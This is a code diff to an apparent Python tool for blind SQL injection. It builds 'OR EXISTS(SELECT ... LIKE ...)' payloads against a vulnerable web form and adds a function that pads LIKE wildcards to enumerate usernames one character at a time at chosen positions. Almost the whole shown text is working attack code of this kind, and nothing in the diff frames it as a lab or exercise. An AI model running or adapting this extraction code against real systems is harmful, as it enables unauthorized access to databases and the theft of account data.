@@ -308,7 +308,7 @@ def aEntries(a, table, url):
    return mhm 
 
 
-def userNameLike(ch, url, notLike = False, notLikeName = ""):
+def userNameLike(ch, url, tableName, notLike = False, notLikeName = ""):
    """
 
    Args: 
@@ -316,6 +316,8 @@ def userNameLike(ch, url, notLike = False, notLikeName = ""):
          string to check for matches in user table. e.g. r matches Rob, Karen, J.R.R. Tolkien  
       url: String
          string of url to form
+      tableName: String
+         name of table containing usernames
       notLike: Boolean
          If set to true, will include a name does not equal notLikeName clause
       notLikeName: string
@@ -326,7 +328,7 @@ def userNameLike(ch, url, notLike = False, notLikeName = ""):
          true if ch matches a username string in the users table 
 
    """
-   payload = "' OR EXISTS(SELECT * FROM users WHERE "
+   payload = "' OR EXISTS(SELECT * FROM " + tableName + " WHERE "
    if(notLike):
       payload += "name!= '" + notLikeName + "' AND "
    payload += "name LIKE '%" + ch + "%') AND ''='"
@@ -335,6 +337,44 @@ def userNameLike(ch, url, notLike = False, notLikeName = ""):
    mhm = readQuery(txt)
    return mhm 
 
+def checkUsernameCharacter(ch, url, tableName,  notLike = False, notLikeName = "", index = "no index"):
+   """checks for character(s) at specified location in any username in table
+
+   Args:
+      index: integer representing the location in the username to check for ch
+         if a negative integer, will count from end of string, e.g. -1 is last character in the string
+         default value is for no index specified, will pad with arbitrary characters
+
+      tableName: string
+         table storing usernames
+
+      url: url of the vulnerable form
+      
+      ch: a single character or group of characters to check
+
+      notLike: boolean
+
+      notLikeName: String
+
+   Returns: 
+      mhm: boolean
+         true if character is found at index for one or more usernames
+         if index = "no index" then it returns true iff character is in the password some user
+
+   Raises:
+      ValueError: invalid index
+   """
+
+   if(index == "no index"):
+      pass # don't change ch
+   elif(index >= 0):
+      ch = index * "_" + ch
+   elif(index < 0):
+      index = -1 * index -1 # so index is non-negative; -1 since end is -1 and begining is 0 not 1. 
+      ch += index * "_"
+   else:
+      raise ValueError("invalid index")
+   return userNameLike(ch, url, tableName, notLike, notLikeName)
 
 def payloadDictionary(payload, lst):
    """creates payload dictionary.
